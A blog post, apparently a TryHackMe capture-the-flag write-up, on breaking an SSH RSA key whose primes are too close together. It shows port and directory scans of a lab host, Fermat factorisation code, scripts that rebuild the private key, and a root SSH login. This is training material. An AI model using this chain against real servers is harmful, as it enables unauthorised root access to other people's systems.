@@ -1,0 +1,188 @@
+---
+layout: post
+title:  "Break RSA (THM)"
+date:   2025-08-01 19:47:43 -0400
+author: robo.uzi
+tags: [CTF, TryHackMe]
+---
+The security of RSA relies on the practical difficulty of factoring the product of two large prime numbers. An RSA key pair is generated using 3 large positive integers. 
+
+`e`: A constant, usually 65537
+
+`n`: The product of 2 large random prime numbers, p and q.
+
+`d`: A large positive integer that makes up the private key. It is calculated as, `d = modinv(e, lcm(p - 1, q - 1))`, where `modinv` is the modulus inverse function and `lcm` is the least common multiple function.
+
+`(e, n)` are public variables and make up the public key. `d` is the private key and is calculated using `p` and `q`. If we could somehow factorize `n` into `p` and `q`, we could then be able to calculate `d` and break RSA. However, factorizing a large number is very difficult and would take some unrealistic amount of time to do so, provided the two prime numbers are randomly chosen.
+
+Below is an implementation of [Fermat's factorization algorithm](https://github.com/murtaza-u/zet/tree/main/20220808171808) in Python.
+```python
+#!/usr/bin/python3
+# pip install gmpy2
+from gmpy2 import isqrt
+from math import lcm
+
+def factorize(n):
+    # since even nos. are always divisible by 2, one of the factors will
+    # always be 2
+    if (n & 1) == 0:
+        return (n/2, 2)
+
+    # isqrt returns the integer square root of n
+    a = isqrt(n)
+
+    # if n is a perfect square the factors will be ( sqrt(n), sqrt(n) )
+    if a * a == n:
+        return a, a
+
+    while True:
+        a = a + 1
+        bsq = a * a - n
+        b = isqrt(bsq)
+        if b * b == bsq:
+            break
+
+    return a + b, a - b
+
+print(factorize(105327569))
+```
+
+`nmap -sVC -vv -T4 10.10.120.62 -oN breakrsanmap.txt`:
+```shell
+PORT   STATE SERVICE REASON  VERSION  
+22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)  
+80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)  
+| http-methods:    
+|_  Supported Methods: GET HEAD  
+|_http-title: Jack Of All Trades  
+|_http-server-header: nginx/1.18.0 (Ubuntu)  
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+`gobuster dir -u http://10.10.120.62 -w /usr/share/wordlists/dirb/common.txt -t 40`:
+```shell
+/development          (Status: 301) [Size: 178] [--> http://10.10.120.62/development/]  
+/index.html           (Status: 200) [Size: 384]
+```
+
+Visiting `http://10.10.120.62/development/` I see two files. `log.txt` contains:
+```text
+The library we are using to generate SSH keys implements RSA poorly. The two
+randomly selected prime numbers (p and q) are very close to one another. Such
+bad keys can easily be broken with Fermat's factorization method.
+
+Also, SSH root login is enabled.
+
+<https://github.com/murtaza-u/zet/tree/main/20220808171808>
+```
+
+I download `id_rsa.pub`:
+```shell
+file id_rsa.pub  
+id_rsa.pub: OpenSSH RSA public key
+
+ssh-keygen -lf id_rsa.pub  
+4096 SHA256:DIqTDIhboydTh2QU6i58JP+5aDRnLBPT8GwVun1n0Co no comment (RSA)
+```
+
+Now I need to find `n` where `n` is the modulus for the public private key pair.
+
+First I use openssh to convert the key to PEM format: `ssh-keygen -e -f id_rsa.pub -m PKCS8 > key.pem`. `PKCS8` is a standard format for encoding cryptographic keys specifically private keys.
+
+I extract the modulus section like this: `openssl rsa -pubin -in key.pem -text -noout`.     `-pubin` means treat the file like a public key. `-in` specifies input file. `-text` shows human readable text and `-noout` supresses the PEM output so you only get the readable parts:
+```shell
+Public-Key: (4096 bit)  
+Modulus:  
+   00:eb:66:1f:28:7b:c4:3c:8f:a9:2d:db:a2:19:f7:  
+   4e:a4:67:b5:f2:27:7b:05:09:57:33:b3:51:aa:7b:  
+   cc:3b:66:05:3e:5c:62:f6......................
+```
+
+I input this to cyberchef and replace the `:` with nothing and remove the whitespace. I then put this hexadecimal string into a python script to get the value of `n`:
+```python
+modulus_hex = "00eb661f287bc43c8fa92ddba219f74ea467b5f22..."
+n = int(modulus_hex, 16)
+print(str(n))
+```
+The script is using pythons built in `int()` function to convert the hex string into an integer. The `16` is for interpreting the base 16 (hexadecimal). Python can then print it for me in decimal (base 10).
+
+I get an `n` value of:
+```shell
+96034377877554948880671622968802...
+```
+
+Now I need to factorize `n` into `p` and `q`. I use the supplied python script and started an virtual environment for python like this:
+```shell
+python3 -m venv venv
+source venv/bin/activate
+deactivate # when you're done
+```
+I run `pip install gmpy2` and finally `python3 factorize.py`.
+
+I get:
+```shell
+p = 309894139792211864408755379621...
+
+q = 309894139792211864408755379621...
+```
+
+Now I need to generate the private key using `p` and `q` (given `e = 65537`). I run `pip install pycryptodome` and make this python script to generate the private key:
+```python
+from Crypto.Util.number import inverse
+from math import lcm
+
+def generate_private_key(p, q, e=65537):
+    # Compute euler totient lcm(p-1, q-1)
+    totient = lcm(p - 1, q - 1)
+    
+    # Compute modular inverse of e mod totient
+    d = inverse(e, totient)
+
+    return d
+
+p = 104729  # example prime
+q = 106681  # example prime
+e = 65537
+
+d = generate_private_key(p, q, e)
+print(f"Private exponent d = {d}")
+```
+
+Here is my output:
+```shell
+python3 privkey.py  
+Private exponent d = 3558006514251356811833907071281089437...
+```
+
+I use this script to build and export the private key in PEM format:
+```python
+from Crypto.PublicKey import RSA
+from Crypto.Util.number import inverse
+
+p = 104729 # Example numbers
+q = 106681 # Example numbers
+e = 65537
+n = 324234 # Example numbers
+d = 325324 # Example numbers
+qinv = inverse(p, q)
+
+# Construct RSA key
+key = RSA.construct((n, e, d, p, q, qinv))
+
+# Export to PEM
+with open("id_rsa", "wb") as f:
+    f.write(key.export_key("PEM"))
+```
+
+I run the script and get:
+```shell
+file id_rsa  
+id_rsa: PEM RSA private key
+```
+
+I want to ssh to the machine so I run `chmod 600 id_rsa` and convert the file with `ssh-keygen -p -m PEM -f id_rsa`. I make the passphrase empty. Looking back I did not need to run this "conversion" with `ssh-keygen`. Simply `chmod`.
+
+From `http://10.10.120.62/development/log.txt` I know I can ssh as root. 
+I ssh with `ssh -i id_rsa root@10.10.120.62` and get the flag.
+
+___
